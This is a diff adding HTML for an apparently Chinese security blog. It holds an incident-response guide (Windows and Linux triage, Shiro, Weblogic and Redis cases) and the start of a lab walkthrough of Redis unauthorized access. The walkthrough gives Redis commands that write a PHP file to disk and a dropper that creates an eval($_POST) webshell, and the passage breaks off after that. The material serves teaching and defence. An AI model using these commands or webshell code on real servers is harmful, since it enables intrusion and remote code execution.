+          <h2 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a><strong>常用方法</strong></h2><ul>
+<li>三要素法：时间、地点、事件</li>
+<li>回溯攻击法：尝试模拟攻击</li>
+<li>经验法：<ul>
+<li>攻击者常用的目录</li>
+<li>黑客惯用手法</li>
+<li>常见恶意程序特征</li>
+</ul>
+</li>
+</ul>
+<h2 id="应急响应阶段"><a href="#应急响应阶段" class="headerlink" title="应急响应阶段"></a>应急响应阶段</h2><p>检测阶段→抑制阶段→根除阶段→恢复阶段→溯源阶段</p>
+<h2 id="应急排查点"><a href="#应急排查点" class="headerlink" title="应急排查点"></a>应急排查点</h2><p><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/1.png" alt="应急排查点"></p>
+<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a><strong>Windows</strong></h2><h3 id="登录记录"><a href="#登录记录" class="headerlink" title="登录记录"></a>登录记录</h3><ol>
+<li>命令输入: gpedit.msc  </li>
+<li>“计算机配置”→“Windows设置”→“安全设置”→“本地策略”→“审核策略”，双击其中的“审核帐户登陆事件”&#x3D;&#x3D;&gt;审核登录事件–&gt;勾上成功&#x2F;失败–&gt;点击应用–&gt;点击确定</li>
+<li>控制面板–&gt;系统和安全–&gt;查看事件日志–&gt;事件查看器–&gt;windows日志–&gt;安全，便可以看到用户的登录和注销以及账户名等信息</li>
+</ol>
+<h3 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h3><ul>
+<li>基本信息：</li>
+</ul>
+<p>msinfo32、systeminfo</p>
+<ul>
+<li>启动项：</li>
+</ul>
+<ol>
+<li>msconfig</li>
+<li>注册表：Run键值、RunOnce键值、RunServicesOnce健值、RunServices健值、RunOneceEx键值（windows xp&#x2F;2003特有）、load健值、Winlogon健值<ol>
+<li>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users</li>
+</ol>
+</li>
+</ol>
+<ul>
+<li>计划任务：<ol>
+<li>compmgmt.msc（计算机管理）下计划任务</li>
+<li>Powershell使用Get-ScheduledTask</li>
+<li>schtasks命令</li>
+</ol>
+</li>
+</ul>
+<h3 id="文件痕迹排查"><a href="#文件痕迹排查" class="headerlink" title="文件痕迹排查"></a>文件痕迹排查</h3><ul>
+<li>敏感目录<ul>
+<li>%WINDIR%</li>
+<li>%WINDIR%\system32\</li>
+<li>%TEMP%</li>
+<li>%LOCALAPPDATA%</li>
+<li>%APPDATA% </li>
+<li>各个盘下的temp（tmp）相关目录下查看有无异常文件</li>
+</ul>
+</li>
+<li>特定时间段的文件情况排查<ul>
+<li>查看文件时间，创建时间，修改的时间，访问时间</li>
+<li>对应的linuxd的ctime,mtime,atime</li>
+<li>查看用户的recent相关文件，通过分析最近打开分析可疑文件<ul>
+<li>C:\Documents and Settings\Administrator\Recent</li>
+<li>C:\Documents and Settings\Default User\Recent</li>
+<li>开始，运行 %UserProfile%\Recent</li>
+</ul>
+</li>
+<li>根据文件夹内文件列表时间进行排序，查找可疑文件。也可以搜索指定时间范围内的文件和文件夹</li>
+</ul>
+</li>
+<li>后门文件的排查</li>
+</ul>
+<h3 id="进程排查"><a href="#进程排查" class="headerlink" title="进程排查"></a>进程排查</h3><ul>
+<li>通过任务管理器进行查看<ul>
+<li>映像路径名称</li>
+<li>命令行</li>
+</ul>
+</li>
+<li>tasklist命令<ul>
+<li>tasklist &#x2F;svc    可以显示每个进程和服务的对应情况</li>
+<li>对于某些加载dll的恶意进程，可以通过&#x2F;m参数进行查询。对于要查询特定dll的调用情况，可以使用命令tasklist  &#x2F;m dll 名称</li>
+</ul>
+</li>
+</ul>
+<p><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/2.png" alt="tasklist命令"></p>
+<ul>
+<li>netstat命令<ul>
+<li>在排查过程中，一般会使用netstat -ano | findstr “ESTABLISHED” 查看目前的网络连接，定位可疑的ESTABLISHED。根据netstat 定位出的pid，再通过tasklist命令进行程序定位</li>
+</ul>
+</li>
+<li>powershell命令<ul>
+<li>Get-WmiObject Win32_Process | select Name,ProcessId,ParentProcessId,Path</li>
+</ul>
+</li>
+<li>wmic命令进行查询<ul>
+<li>wmic process where name&#x3D;’powershell.exe’ get caption,commadnline,processid,parentprocessid &#x2F;value</li>
+</ul>
+</li>
+</ul>
+<h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><ol>
+<li>通过内置的日志筛选器进行分析，可以通过事件ID，关键字等对日志进行筛选</li>
+<li>通过Powershell对日志进行分析<ol>
+<li>通过powershell进行查询最常用到两个命令是Get-EventLog和Get-WinEvent，两者的区别是GetEventLog只获取传统的事件日志，而Get-WinEvent cmdlet 从包括传统日志（例如系统日志和应用程序日志）在内的事件日志和 Windows Vista 中引入的新 Windows 事件日志技术生成的事件日志中获取事件。</li>
+</ol>
+</li>
+<li>通过相关的日志工具进行分析查询</li>
+</ol>
+<ul>
+<li>主机日志<ul>
+<li>应用程序</li>
+<li>安全性</li>
+<li>系统</li>
+</ul>
+</li>
+<li>其他日志<ul>
+<li>IIS日志</li>
+<li>Apache日志</li>
+<li>Tomcat日志</li>
+</ul>
+</li>
+</ul>
+<h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><h3 id="查看用户相关分析"><a href="#查看用户相关分析" class="headerlink" title="查看用户相关分析"></a>查看用户相关分析</h3><pre><code>  1. useradd userdel 的命令时间变化（stat），以及是否包含可疑信息
+  2. cat /etc/passwd 分析可以账号，可登录账号
+</code></pre>
+<h3 id="系统信息-1"><a href="#系统信息-1" class="headerlink" title="系统信息"></a>系统信息</h3><h4 id="查看分析history"><a href="#查看分析history" class="headerlink" title="查看分析history"></a>查看分析history</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /root/.bash_history</span><br></pre></td></tr></table></figure>
+
+<pre><code>  1. wget远程某主机（域名&amp;IP）的远控文件；
+  2. 尝试连接内网某主机（ssh scp），便于分析攻击者意图
+  3. 打包某敏感数据或代码，tar zip 类命令
+  4. 对系统进行配置，包含命令修改、远控木马类，可找到攻击者关联信息
+</code></pre>
+<h4 id="启动项"><a href="#启动项" class="headerlink" title="启动项"></a>启动项</h4><p>启动项作为恶意病毒的一个常用的驻留手段，以下几个地方可以查找启动项相关的内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/rc.local</span><br><span class="line">/etc/rc.local</span><br><span class="line">rc.local</span><br><span class="line">/etc/init.d</span><br></pre></td></tr></table></figure>
+
+<h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><ul>
+<li>通过crontab -l 查看当前的任务计划有哪些，也可以指定用户进行查看<ul>
+<li>crontab -u root -l 是root下的计划任务</li>
+</ul>
+</li>
+<li>查看etc目录任务计划相关文件，一般存在计划任务的目录有以下，可以通过浏览下面的计划任务文件的方式来查看计划任务</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> /etc/cron*</span><br><span class="line">crontab -l</span><br></pre></td></tr></table></figure>
+
+<h4 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h4><p>使用netstat 网络连接命令，分析可疑端口、可疑IP、可疑PID及程序进程</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp | more</span><br></pre></td></tr></table></figure>
+
+<p>如下图所示，为某恶意程序的外链信息。然后根据pid，利用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> –alh /proc/pid</span><br></pre></td></tr></table></figure>
+
+<p>命令查看其对应的可执行程序<br><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/3.png" alt="ls –alh /proc/pid"><br>也可以利用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof –p pid</span><br></pre></td></tr></table></figure>
+
+<p>查看pid对应的可执行程序,如果是恶意进程，可以使用kill -9（数字九） 进程的PID值命令来结束进程，如kill -9 2535，然后使用 rm -rf filename 来删除木马，如果root用户都无法删除相关文件，很可能文件被加上了i属性，使用 lsatter filename 命令来查看文件属性，然后使用chattr -i filename 命令来移除i属性继而删除文件；也有的进程因为存在守护进程而无法杀除，可以先把进程挂起，再杀掉守护进程后，再回来把进程杀掉。</p>
+<h4 id="文件痕迹排查-1"><a href="#文件痕迹排查-1" class="headerlink" title="文件痕迹排查"></a>文件痕迹排查</h4><ul>
+<li>时间点</li>
+</ul>
+<p>find: 在指定目录下查找文件<br>-type b&#x2F;d&#x2F;c&#x2F;p&#x2F;l&#x2F;f 查找是块设备、目录、字符设备、管道、符号链接、普通文件<br>-mtime -n +n 按文件更改时间来查找文件，-n 指 n天以内，+n 指 n 天前<br>-atime -n +n 按文件访问时间来查找文件，-n 指n 天以内，+n 指 n天前<br>-ctime -n +n 按文件创建时间来查找文件， -n指n天以内，+n指n天前<br>find &#x2F; -ctime 0 -name “*.sh”</p>
+<ul>
+<li>特殊文件</li>
+</ul>
+<p>查找777的权限文件 find &#x2F; *.jsp -perm 777<br>webshell<br><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/4.png" alt="webshell"><br>查看目标系统命令的修改时间：ls -alt &#x2F;bin</p>
+<h4 id="日志分析-1"><a href="#日志分析-1" class="headerlink" title="日志分析"></a>日志分析</h4><p><strong>var&#x2F;log下的具体功能</strong></p>
+<ul>
+<li>&#x2F;var&#x2F;log&#x2F;wtmp 登录进入，退出，数据交换、关机和重启记录</li>
+<li>&#x2F;var&#x2F;log&#x2F;lastlog 文件记录用户最后登录的信息</li>
+<li>&#x2F;var&#x2F;log&#x2F;secure 记录登入系统存取数据的文件，如 pop3&#x2F;ssh&#x2F;telnet&#x2F;ftp</li>
+<li>&#x2F;var&#x2F;log&#x2F;cron 与定时任务相关的日志信息，记录crontab命令是否被正确的执行</li>
+<li>&#x2F;var&#x2F;log&#x2F;message 系统启动后的信息和错误日志</li>
+<li>&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log apache的访问日志</li>
+<li>&#x2F;var&#x2F;log&#x2F;auth.log 包含系统授权信息，包括用户登录和使用的权限机制等</li>
+<li>&#x2F;val&#x2F;log&#x2F;userlog 记录所有登记用户的信息日志</li>
+<li>&#x2F;var&#x2F;log&#x2F;xferlog(vsftp.log)记录linux FTP日志</li>
+<li>&#x2F;var&#x2F;log&#x2F;history 用户登录时间IP为名字的文件, 内容为用户执行命令的日志信息</li>
+<li>&#x2F;var&#x2F;log&#x2F;faillog 记录登录系统不成功的账号信息</li>
+</ul>
+<p><strong>另外</strong></p>
+<pre><code>  - last 为登陆成功日志
+  - lastb为登录失败，可查看是否爆破
+  - stat 查看日志创建时间
+  - 如果怀疑某个文件为木马控制端，可直接对文件进行调试查看传递信息
+</code></pre>
+<p>strace -p pid #调试进程</p>
+<pre><code>  - history 或 cat ~/.bash_history 查看历史命令，查找痕迹
+</code></pre>
+<p><strong>入侵者可能会删除机器的日志信息，可以查看日志信息是否还存在或者是否被清空，相关命令示例：</strong><br>root@ahuan:~# ll -h &#x2F;var&#x2F;log&#x2F;*<br>-rw-r–r–  1 root      root               0 Mar  1 06:25 &#x2F;var&#x2F;log&#x2F;alternatives.log<br>-rw-r–r–  1 root      root             283 Feb 25 09:57 &#x2F;var&#x2F;log&#x2F;alternatives.log.1<br>-rw-r–r–  1 root      root             214 Feb 18 11:57 &#x2F;var&#x2F;log&#x2F;alternatives.log.2.gz<br>-rw-r–r–  1 root      root             477 Dec 20 23:29 &#x2F;var&#x2F;log&#x2F;alternatives.log.3.gz<br>-rw-r–r–  1 root      root            2.0K Nov 30 22:56 &#x2F;var&#x2F;log&#x2F;alternatives.log.4.gz</p>
+<h4 id="恶意流量"><a href="#恶意流量" class="headerlink" title="恶意流量"></a>恶意流量</h4><p>netstat -anlpt 查看是否存在恶意流量（通过威胁情报进行判定是否为恶意域名）<br>查找对应流量连接位置<br>ls -al &#x2F;proc&#x2F;PID (根据查到pid进程输入)</p>
+<p>如 ls -al &#x2F;proc&#x2F;791<br>exe -&gt; 指向启动当前进程的可执行文件（完整路径）的符号链接</p>
+<h2 id="web漏洞应急篇"><a href="#web漏洞应急篇" class="headerlink" title="web漏洞应急篇"></a>web漏洞应急篇</h2><h2 id="Apache-Shiro攻击"><a href="#Apache-Shiro攻击" class="headerlink" title="Apache Shiro攻击"></a>Apache Shiro攻击</h2><p>特征rememberMe<br>恶意 Cookie rememberMe值构造<br>前16字节的密钥 -&gt; 后面加入序列化参数 -&gt; AES加密 -&gt; base64编码 -&gt; 发送cookie</p>
+<p>Apache Shiro处理cookie的流程<br>得到rememberMe的cookie值 -&gt; Base64解码 -&gt; AES-128-CBC解密-&gt; 反序列化(readobject)</p>
+<p><strong>应急流程</strong><br>设备查看告警信息，对remeberMe进行解密，查看反弹IP&#x2F;域名进行进一步溯源，<br>reneberMe管理代码中写道cookie加密密钥默认为AES算法，可以将黑客常用的攻击密钥做一个keylist进行解密，直接在解密内容里查看payload。</p>
+<p>排查思路，该漏洞都是通过remeberMe进行传入payload，直接对日志shiro进行反编译即可查到相关信息（vps、未公开的利用链，特殊的payload）</p>
+<h2 id="Weblogic攻击"><a href="#Weblogic攻击" class="headerlink" title="Weblogic攻击"></a>Weblogic攻击</h2><p>流量层：可以直接查看到访问地址数据包内payload<br>如CVE-2020-2551(iiop)漏洞主要是通过 JtaTransactionManager 来进行加载 LDAP 协议的内容<br><strong>在日志里显示：</strong><br>Weblogic日志主要分为：Server日志、HTTP日志和DOMAIN日志；</p>
+<p>1、Server日志<br>主要功能：记录Weblogic Server启动至关闭过程中的运行信息和错误信息。<br>日志结构：时间戳、严重程度、子系统、计算机名、服务器名、线程 ID、用户 ID、事务 ID、诊断上下文 ID、原始时间值、消息 ID 和消息文本。<br>2、DOMAIN日志<br>主要功能：记录一个DOMAIN下的各个Weblogic Server的启动至关闭过程中的运行信息和错误信息。<br>日志结构：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">####<span class="tag">&lt;<span class="name">Oct</span> <span class="attr">18</span>, <span class="attr">2018</span> <span class="attr">2:21:11</span> <span class="attr">PM</span> <span class="attr">CST</span>&gt;</span>     &lt;[ACTIVE]ExecuteThread: &#x27;9&#x27; for queue: &#x27;weblogic.kernel.Default (self-tuning)&#x27;&gt; <span class="tag">&lt;&gt;</span> <span class="tag">&lt;&gt;</span> <span class="tag">&lt;&gt;</span> &lt;1539843671288&gt;  </span><br></pre></td></tr></table></figure>
+
+<p>iiop协议不会在http请求中有记录，应急主要注意domain日志的记录</p>
+<p>应急流程：<br><strong>t3协议</strong><br>临时处置方式：<br>1.及时更新补丁<br>2.禁用T3协议<br>3.禁止T3端口对外开放, 或者限制可访问T3端口的IP来源<br>漏洞列表：<br>CVE-2017-3248<br>CVE-2018-2628<br>CVE-2018-2893<br>CVE-2019-2890<br>CVE-2020-2555<br><strong>iiop协议</strong><br>临时处置：<br>1.及时更新补丁<br>2.通过 Weblogic 控制台进行关闭 IIOP 协议<br>漏洞列表：<br>CVE-2020-2551</p>
+<h2 id="Redis未授权"><a href="#Redis未授权" class="headerlink" title="Redis未授权"></a>Redis未授权</h2><p>1.写webshell<br>2.写ssh密钥<br>3.写计划任务反弹shell</p>
+<h3 id="应急流程："><a href="#应急流程：" class="headerlink" title="应急流程："></a>应急流程：</h3><p>查看配置信息是否存在异常（根据显示信息可判断是哪种攻击方式）<br>config get *<br><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/5.png" alt="config get *"><br>写ssh密钥<br><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/6.png" alt="写ssh密钥"><br>反弹shell<br><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/7.png" alt="反弹shell"><br>写文件路径<br>查看key信息是否有攻击队特征信息<br><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/8.png" alt="查看key信息是否有攻击队特征信息"><br>如果发现攻击队正在操作redis，可以使用 monitor命令进行检测<br><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/8.png" alt="monitor命令进行检测"></p>
+<h2 id="冰蝎与内存马攻击"><a href="#冰蝎与内存马攻击" class="headerlink" title="冰蝎与内存马攻击"></a>冰蝎与内存马攻击</h2><ul>
+<li>冰蝎</li>
+</ul>
+<p>特征：后缀为动态脚本（jsp、asp、php） 请求体加密状态</p>
+<ul>
+<li>内存马</li>
+</ul>
+<p>攻击特征：没有落地文件通常以 <a target="_blank" rel="noopener" href="http://url.com/xxx/">http://url.com/xxx/</a> (直接以某个文件夹为路径)<br><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/10.png" alt="内存马"><br><strong>应急思路</strong><br>针对webshell，可直接对web路径下查找动态脚本文件，也可以直接搜索文件内特征值<br><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/11.png" alt="find / -name *.jsp*"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name *.jsp | xargs grep &quot;pass&quot;</span><br></pre></td></tr></table></figure>
+
+<p>（pass为特征值，可以修改。如果返回内容过多可自行修改特征）</p>
+<p><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/12.png" alt="pass特征"><br>对于内存马，虽然现在有各种文章分析如何提取，但最简单的方法还是重启解决问题。<br>如果想知道如何手动清理，请移步至：<br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIwMDk1MjMyMg==&mid=2247485680&idx=1&sn=bbd2bd94da7720c6567c462c8559cfdd&scene=21#wechat_redirect">https://mp.weixin.qq.com/s/DRbGeVOcJ8m9xo7Gin45kQ</a><br>修复建议：<br>1.根据漏洞来定，如果是程序漏洞修复即可<br>2.上传漏洞，禁止上传动态脚本文件，采用白名单机制仅允许特定后缀上传</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/DRbGeVOcJ8m9xo7Gin45kQ">https://mp.weixin.qq.com/s/DRbGeVOcJ8m9xo7Gin45kQ</a></li>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/w3c7tKfj1Plcbv57Gz8M0g">https://mp.weixin.qq.com/s/w3c7tKfj1Plcbv57Gz8M0g</a></li>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/f38CmhZCXPvz5P-c17z-Bw">https://mp.weixin.qq.com/s/f38CmhZCXPvz5P-c17z-Bw</a></li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://suiyideali.github.io/2023/04/20/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="m0ch4z">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Geek小黑板">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/04/20/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/" class="post-title-link" itemprop="url">Redis未授权访问初探</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-04-20 21:40:01 / 修改时间：23:02:33" itemprop="dateCreated datePublished" datetime="2023-04-20T21:40:01+08:00">2023-04-20</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="一、简介和危害"><a href="#一、简介和危害" class="headerlink" title="一、简介和危害"></a>一、简介和危害</h2><h3 id="1-什么是redis未授权访问漏洞"><a href="#1-什么是redis未授权访问漏洞" class="headerlink" title="1. 什么是redis未授权访问漏洞"></a>1. 什么是redis未授权访问漏洞</h3><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 &#x2F;root&#x2F;.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p>
+<p>漏洞产生的条件：</p>
+<ol>
+<li>redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网；</li>
+<li>没有设置密码认证（一般为空），可以免密码远程登录redis服务。</li>
+</ol>
+<h3 id="2-漏洞危害"><a href="#2-漏洞危害" class="headerlink" title="2 漏洞危害"></a>2 漏洞危害</h3><ol>
+<li>攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据； </li>
+<li>攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件； </li>
+<li>最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器</li>
+</ol>
+<h2 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h2><ul>
+<li>漏洞环境<ul>
+<li>靶机ip：192.168.0.110</li>
+<li>攻击机ip：192.168.0.111</li>
+</ul>
+</li>
+</ul>
+<p>使用命令启动redis服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server /etc/redis-conf</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis1.png"></p>
+<p>启动redis服务进程后，就可以使用测试攻击机程序redis-cli和靶机的redis服务交互了。 比如：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.0.110</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis2.png"><br /> </p>
+<h3 id="3-基础命令"><a href="#3-基础命令" class="headerlink" title="3. 基础命令"></a>3. 基础命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#连接redis</span></span><br><span class="line"></span><br><span class="line">redis-cli -h ip -p 6379 -a passwd</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看redis版本信息等</span></span><br><span class="line"></span><br><span class="line">info</span><br><span class="line"></span><br><span class="line"><span class="comment">#列出当前数据库中所有的键</span></span><br><span class="line"></span><br><span class="line">keys *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除所有数据(谨慎使用)</span></span><br><span class="line"></span><br><span class="line">flushall</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置主从关系</span></span><br><span class="line"></span><br><span class="line">slaveof ip port</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置一个键的值</span></span><br><span class="line"></span><br><span class="line">SET key value</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取一个建的值</span></span><br><span class="line"></span><br><span class="line">GET key </span><br></pre></td></tr></table></figure>
+
+<h3 id="4-未授权访问复现"><a href="#4-未授权访问复现" class="headerlink" title="4. 未授权访问复现"></a>4. 未授权访问复现</h3><p>使用redis客户端直接无账号成功登录redis：<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis3.png"><br />从登录的结果可以看出该redis服务对公网开放，且未启用认证。</p>
+<h4 id="4-1-利用redis写webshell"><a href="#4-1-利用redis写webshell" class="headerlink" title="4.1 利用redis写webshell"></a>4.1 利用redis写webshell</h4><p><strong>利用前提</strong>：</p>
+<ol>
+<li>靶机redis链接未授权，在攻击机上能用redis-cli连上，如上图，并未登陆验证</li>
+<li>开了web服务器，并且知道路径（如利用phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限（我们可以将dir设置为一个目录a，而dbfilename为文件名b，再执行save或bgsave，则我们就可以写入一个路径为a&#x2F;b的任意文件。）</li>
+</ol>
+<p>这里由于本地搭建，我们已经知道目录，我们把shell写入&#x2F;home&#x2F;ali目录下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /home/ali</span><br><span class="line">config <span class="built_in">set</span> dbfilename redis.php</span><br><span class="line"><span class="built_in">set</span> wenshell <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><br /> <img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis4.png"></p>
+<p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis5.png"></p>
+<p>因为直接这样写会乱码。所以改良一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> x <span class="string">&quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>\r\n\r\n代表换行的意思，用redis写入的文件会自带一些版本信息，如果不换行可能会导致无法执行。<br />shell写入完成，在靶机上来证明：<br />写入webshell<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis6.png"><br />查看shell.php<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis7.png"><br />当数据库过大时，redis写shell的小技巧：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">set_time_limit(0);</span><br><span class="line"><span class="variable">$fp</span>=fopen(<span class="string">&#x27;mocha.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">fwrite(<span class="variable">$fp</span>,<span class="string">&#x27;&lt;?php @eval($_POST[\&quot;mocha\&quot;]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="built_in">exit</span>();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
